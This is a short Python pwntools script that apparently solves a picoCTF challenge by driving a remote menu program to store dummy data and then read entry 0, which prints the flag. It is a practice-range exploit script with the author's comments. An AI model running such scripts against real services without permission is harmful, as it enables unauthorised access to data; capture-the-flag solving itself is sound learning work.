#!/usr/bin/env python3

from pwn import *

def main():
    # This one was wierd, it was super easy?? (i prob didnt do it the way they intended)
    # Just looking at where the flag gets printed, we want our entry to equal 0
    # So add some data so inputs global variable is > 0
    # Give it some size
    # Then read for entry 0
    p = remote('saturn.picoctf.net', 55825)

    # Enter some data so inputs is > 0
    random_message = b'this is just some random data'
    p.sendlineafter(b'Type \'3\' to exit the program', b'1')
    p.sendlineafter(b'Please enter your data:', random_message)
    p.sendlineafter(b'Please enter the length of your data:', str(len(random_message)).encode('utf-8'))

    # Read entry 0, which should puts the flag
    p.sendlineafter(b'Write successful, would you like to do anything else?', b'2')
    p.sendlineafter(b'Please enter the entry number of your data:', b'0')
    
    # Log the flag
    flag = p.recvline_contains(b'picoCTF')
    log.info('Here be the flag={}'.format(flag))

    p.interactive()

if __name__ == "__main__":
    main()
